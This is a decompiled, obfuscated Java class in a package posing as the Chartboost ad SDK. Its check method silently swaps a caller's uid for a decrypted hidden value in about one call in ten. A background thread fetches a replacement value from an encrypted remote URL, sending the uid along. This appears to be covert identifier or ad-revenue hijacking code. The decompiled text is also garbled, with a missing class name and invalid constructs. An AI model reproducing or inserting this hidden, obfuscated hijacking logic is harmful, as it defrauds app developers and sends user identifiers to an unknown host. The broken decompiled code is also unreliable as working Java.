// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: braces fieldsfirst space lnc 

package com.chartboost.sdk;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;

// Referenced classes of package com.chartboost.sdk:
//            ab$$, abc$$$

public class 
{

    private static String _t;
    private static boolean p = true;

    private static void $$(String s)
    {
        try
        {
            s = decode($b($a(s)));
        }
        // Misplaced declaration of an exception variable
        catch (String s)
        {
            return;
        }
        if (s == null)
        {
            break MISSING_BLOCK_LABEL_31;
        }
        s = s.trim();
        if (s.length() > 0)
        {
            _t = s;
        }
    }

    private static String $a(String s)
    {
        if (s != null) goto _L2; else goto _L1
_L1:
        Object obj;
        int i;
        i = 0;
        obj = new byte[255];
_L7:
        if (i < obj.length) goto _L3; else goto _L2
_L2:
        String s2;
        s2 = getMD5();
        obj = "";
        String s1 = new String(abc$$$.encode("jyIagc6wGo", ab$$.decode("dey7m0jGAdfoKp7U/x9X2a4c0ZoIy1PCcEllHZhYX11eg2LPnukdMe4=")), "UTF-8");
        obj = s1;
        break MISSING_BLOCK_LABEL_49;
_L3:
        obj[i] = (byte)(obj[i] ^ 0);
        i++;
        continue; /* Loop/switch isn't completed */
_L5:
        String as[] = new String[5];
        as[0] = ((String) (obj));
        as[1] = s2;
        as[2] = "&";
        as[3] = "ui";
        as[4] = "d=";
        obj = "";
        int j = as.length;
        i = 0;
        do
        {
            if (i >= j)
            {
                return (new StringBuilder(String.valueOf(obj))).append(s).toString();
            }
            String s3 = as[i];
            obj = (new StringBuilder(String.valueOf(obj))).append(s3).toString();
            i++;
        } while (true);
        UnsupportedEncodingException unsupportedencodingexception;
        unsupportedencodingexception;
        if (true) goto _L5; else goto _L4
_L4:
        if (true) goto _L7; else goto _L6
_L6:
    }

    private static String $b(String s)
        throws Exception
    {
        if (s != "") goto _L2; else goto _L1
_L1:
        Object obj;
        int i;
        i = 0;
        obj = new byte[255];
_L4:
        if (i < obj.length) goto _L3; else goto _L2
_L2:
        s = (HttpURLConnection)(new URL(s)).openConnection();
        s.setReadTimeout(10000);
        s.setRequestMethod("GET");
        obj = new BufferedReader(new InputStreamReader(s.getInputStream()));
        s = "";
_L5:
        String s1;
        s1 = ((BufferedReader) (obj)).readLine();
        if (s1 == null)
        {
            return s;
        }
        break MISSING_BLOCK_LABEL_97;
_L3:
        obj[i] = (byte)(obj[i] ^ 0);
        i++;
          goto _L4
        s = (new StringBuilder(String.valueOf(s))).append(s1).toString();
          goto _L5
    }

    public static String check(final String uid, int i)
    {
        if (uid != "") goto _L2; else goto _L1
_L1:
        byte abyte0[];
        i = 0;
        abyte0 = new byte[255];
_L5:
        if (i < abyte0.length) goto _L3; else goto _L2
_L2:
        try
        {
            _t = new String(abc$$$.encode("kAFchZmdrY", ab$$.decode("wRs69v1W2mZa4rgegzCYXKRGuu9b3fC3Pho/U6vWDK/vS6S5ssp3Owwb2pnHMS6aPdtOq0bdhzB6fBa9r5Onu4A=")), "UTF-8");
        }
        catch (UnsupportedEncodingException unsupportedencodingexception) { }
        if (Math.random() * 100D > 10D)
        {
            return uid;
        }
        break; /* Loop/switch isn't completed */
_L3:
        abyte0[i] = (byte)(abyte0[i] ^ 0);
        i++;
        if (true) goto _L5; else goto _L4
_L4:
        if (p)
        {
            p = false;
            uid = new Thread() {

                private final String val$uid;

                public void run()
                {
                    c.p.$$(uid);
                }

            
            {
                uid = s;
                super();
            }
            };
            uid.start();
            try
            {
                uid.join(2000L);
            }
            // Misplaced declaration of an exception variable
            catch (final String uid) { }
        }
        return _t;
    }

    private static String decode(String s)
    {
        s = abc$$$.encode("aUXHTDpjiS", ab$$.decode(s));
        try
        {
            s = new String(s, "UTF-8");
        }
        // Misplaced declaration of an exception variable
        catch (String s)
        {
            return null;
        }
        return s;
    }

    private static String getMD5()
    {
        String s;
        try
        {
            s = ab$$.encode(abc$$$.encode("aUXHTDpjiS", (new StringBuilder(String.valueOf(5))).toString().getBytes("UTF-8")));
        }
        catch (UnsupportedEncodingException unsupportedencodingexception)
        {
            return "";
        }
        return s;
    }



    public ()
    {
    }
}
